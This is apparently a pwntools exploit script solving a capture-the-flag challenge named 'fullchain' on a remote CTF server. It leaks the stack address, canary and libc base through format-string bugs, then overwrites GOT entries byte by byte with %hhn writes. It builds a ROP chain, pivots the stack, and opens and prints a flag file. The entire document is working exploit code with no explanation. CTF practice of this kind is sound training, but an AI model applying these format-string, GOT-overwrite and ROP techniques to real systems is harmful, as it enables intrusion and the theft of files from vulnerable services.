from pwn import *
import time
context.timeout = 1000000
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
r = remote('edu-ctf.zoolab.org', 30201)
#r = process('./fullchain')




# get stack address
r.sendafter(' > ', b'local\n')
r.sendafter(' > ', b'write%10$p\n')
tmp = r.recvuntil('global').decode('utf-8').split('write')[1].split('g')[0]
stack = int(tmp, 16)
print(f'stack: {hex(stack)}')


# modify cnt
cnt_offset = -0x30 + 4
def reset_cnt ():
    r.sendafter(' > ', b'local\n')
    r.sendafter(' > ', b'read\n')
    payload = p64(0) + p64(0) + p64(stack + cnt_offset)
    r.sendline(payload)
    r.sendafter(' > ', b'local\n')
    r.sendafter(' > ', b'write%16$n\n')

reset_cnt()

r.sendafter(' > ', b'global\n')
r.sendafter(' > ', b'read\n')
r.send(b'%17$p,%18$p,%19$p,%16$p\n')
r.sendafter(' > ', b'global\n')
r.sendafter(' > ', b'write\n')
tmp = r.recvuntil('global').decode("utf-8")
tmps = tmp.split(',')
print(tmps)
canary = int(tmps[0], 16)
text = int(tmps[2], 16) - 0x17e1
__libc_csu_init = text + 0x1800
print(f'canary: {hex(canary)}')
print(f'stack: {hex(stack)}')
print(f'text: {hex(text)}')
print(f'__libc_csu_init: {hex(__libc_csu_init)}')
reset_cnt()


def get_int (addr):
    r.sendafter(' > ', b'local\n')
    r.sendafter(' > ', b'read\n')
    payload = p64(0) + p64(0) + p64(addr)
    r.sendline(payload)
    r.sendafter(' > ', b'local\n')
    r.sendafter(' > ', b'write%16$s\n')
    tmp = r.recvuntil('global')[5:-6]
    tmp += (8 - len(tmp)) * b'\0'
    reset_cnt()
    return u64(tmp)

printf_got = text + 0x4048
memset_got = text + 0x4058
__stack_chk_fail_got = text + 0x4040

exit_got = text + 0x4070
puts_got = text + 0x4030
scanf_got = text + 0x4068
call_puts = text + 0x1751
call_memset = text + 0x1517
printf_libc = get_int(printf_got)
libc_addr = printf_libc - 0x64e10
read_libc_addr = libc_addr + 0x111130
open_libc_addr = libc_addr + 0x110e50 + 89
write_libc_addr = libc_addr + 0x1111d0
#open_libc_addr = libc_addr + 0x110e50
pop_rax_ret_addr = libc_addr + 0x4a550
pop_rdi_ret_addr = libc_addr + 0x26b72
pop_rsi_ret_addr = libc_addr + 0x27529
leave_ret_addr = libc_addr + 0x5aa48
ret_addr = libc_addr + 0x25679
syscall_addr = libc_addr + 0x2584d

pop_r12_r13_r14_r15_rbp_ret = libc_addr + 0x276e2
pop_r12_r13_r14_r15_ret = libc_addr + 0x26b6b
pop_r12_r13_r14_ret = libc_addr + 0x2959a
mov_rax_pop_rdx_r12_ret = libc_addr + 0x11c36f
#11c36f : mov eax, esp ; pop rdx ; pop r12 ; ret
#exev_libc = printf_libc - 0x7ffff7deee10 + 0x7ffff7e70a00
exev_libc = printf_libc - 0x7ffff7deee10 + 0x7ffff7e70450
print(f'printf: {hex(printf_libc)}')

def set_one (addr):
    r.sendafter(b'local > ', b'local\n')
    r.sendafter(b'write > ', b'read\n')
    payload = p64(0) + p64(addr)
    r.sendline(payload)
    r.sendafter(b'local > ', b'global\n')
    r.sendafter(b'write > ', b'read\n')
    r.send(b'1' * 17 + b'%15$hhn\n')
    r.recvuntil(b'global')
    r.sendafter(b'local > ', b'global\n')
    r.sendafter(b'write > ', b'write\n')

def set_zero (addr):
    r.sendafter(' > ', b'local\n')
    r.sendafter(' > ', b'read\n')
    payload = p64(0) + p64(0) + p64(addr)
    r.sendline(payload)
    r.sendafter(' > ', b'global\n')
    r.sendafter(' > ', b'read\n')
    r.send(b'%16$hhn\n')
    r.sendafter(' > ', b'global\n')
    r.sendafter(' > ', b'write\n')

# set big number to cnt
set_one(stack + cnt_offset + 2)
stack_buffer = stack - 0x400


## num < 256
def set_char (addr, num):
    r.sendafter(' > ', b'local\n')
    r.sendafter(' > ', b'read\n')
    payload = p64(0) + p64(addr)
    r.sendline(payload)
    r.sendafter(' > ', b'global\n')
    r.sendafter(' > ', b'read\n')
    if (num):
        r.send(f'%{num}c%15$hhn\n')
    else:
        r.send(f'%15$hhn\n')
    r.recvuntil(b'global')
    r.sendafter(' > ', b'global\n')
    r.sendafter(' > ', b'write\n')

def set_u64 (addr, num):
    for i in  range(8):
        set_char(addr + i, num % 256)
        num //= 256

print(f'exevc: {hex(exev_libc)}')
print(f'memset got: {hex(memset_got)}')
#set_char(exit_got, leave_ret_addr % 256)
#set_char(exit_got + 1, leave_ret_addr // (2 ** 8) % 256)
#set_char(exit_got + 2, leave_ret_addr // (2 ** 16) % 256)

rop_stack = stack - 0x8
new_stack = stack + 0x100

def push_rop_stack (value):
    global rop_stack
    set_u64(rop_stack, value)
    rop_stack += 8

set_u64(exit_got, pop_r12_r13_r14_ret)
set_u64(__stack_chk_fail_got, read_libc_addr)
set_u64(memset_got, open_libc_addr)
set_u64(puts_got, read_libc_addr)
#set_u64(scanf_got, write_libc_addr)

#set_u64(rop_stack, mov_rax_pop_rdx_r12_ret)
#set_u64(rop_stack + 0x8, 0x200)
#set_u64(rop_stack + 0x10, 0x0)
#
#set_u64(rop_stack + 0x18 , pop_rax_ret_addr)
#set_u64(rop_stack + 0x20, 0)
#set_u64(rop_stack + 0x28, pop_rdi_ret_addr)
#set_u64(rop_stack + 0x30, 0)
#set_u64(rop_stack + 0x38, pop_rsi_ret_addr)
#set_u64(rop_stack + 0x40, new_stack)
#set_u64(rop_stack + 0x48, text + 0x17f5)

print(hex(new_stack - 0x20))
print(f'call memset: {hex(call_memset)}')
print(hex(call_puts))
print(hex(leave_ret_addr))

# read(0, new_stack, 0x200)
push_rop_stack(leave_ret_addr)
push_rop_stack(new_stack)
push_rop_stack(mov_rax_pop_rdx_r12_ret)
push_rop_stack(0x200)
push_rop_stack(0x0)
push_rop_stack(pop_rax_ret_addr)
push_rop_stack(0)
push_rop_stack(pop_rdi_ret_addr)
push_rop_stack(0)
push_rop_stack(pop_rsi_ret_addr)
push_rop_stack(new_stack)
push_rop_stack(call_puts)
push_rop_stack(0xdeadbeef)
push_rop_stack(0xdeadbeef)
push_rop_stack(leave_ret_addr) # pivot to new stack
#push_rop_stack(rop_stack + 0x8)
push_rop_stack(new_stack + 0x400)
#push_rop_stack(mov_rax_pop_rdx_r12_ret)


r.sendafter(' > ', p64(mov_rax_pop_rdx_r12_ret) + b'\n')


filename = b'/home/fullchain/flag'
#filename = b'/home/u20/flag'
format_s = b'>>%s<<\n'
string = filename + b'\0' * (0x20 - len(filename))
string += format_s + b'\0' * (0x20 - len(format_s))
payload = b''
filename_buffer = new_stack + 0x200
flag_buffer = filename_buffer + 0x40

def push_payload (value):
    global payload
    payload += p64(value)

# read file name
push_payload(new_stack + 0x400)
push_payload(mov_rax_pop_rdx_r12_ret)
push_payload(0x20)
push_payload(0)
push_payload(pop_rax_ret_addr)
push_payload(0)
push_payload(pop_rdi_ret_addr)
push_payload(0)
push_payload(pop_rsi_ret_addr)
push_payload(filename_buffer)
push_payload(call_puts)

push_payload(0xdeadbeef)
push_payload(0xdeadbeef)
push_payload(mov_rax_pop_rdx_r12_ret)
push_payload(0)
push_payload(0)
push_payload(pop_rax_ret_addr)
push_payload(2)
push_payload(pop_rdi_ret_addr)
push_payload(filename_buffer)
push_payload(pop_rsi_ret_addr)
push_payload(0)
push_payload(call_memset)
push_payload(1)
push_payload(2)
push_payload(3)
push_payload(4)
push_payload(canary)
push_payload(6)
for i in range(7, 15):
    push_payload(i)

# read flag
push_payload(mov_rax_pop_rdx_r12_ret)
push_payload(0x20)
push_payload(0)
push_payload(pop_rax_ret_addr)
push_payload(1)
push_payload(pop_rdi_ret_addr)
push_payload(3)
push_payload(pop_rsi_ret_addr)
push_payload(flag_buffer)
push_payload(call_puts)

# write flag
push_payload(0xdeadbeef)
push_payload(0xdeadbeef)
push_payload(mov_rax_pop_rdx_r12_ret)
push_payload(0x20)
push_payload(0)
push_payload(pop_rax_ret_addr)
push_payload(1)
push_payload(pop_rdi_ret_addr)
push_payload(1)
push_payload(pop_rsi_ret_addr)
push_payload(flag_buffer)
push_payload(call_memset)


print(hex(open_libc_addr))
print(hex(stack))
r.sendline(payload)
pause()
r.sendline(string)
r.interactive()
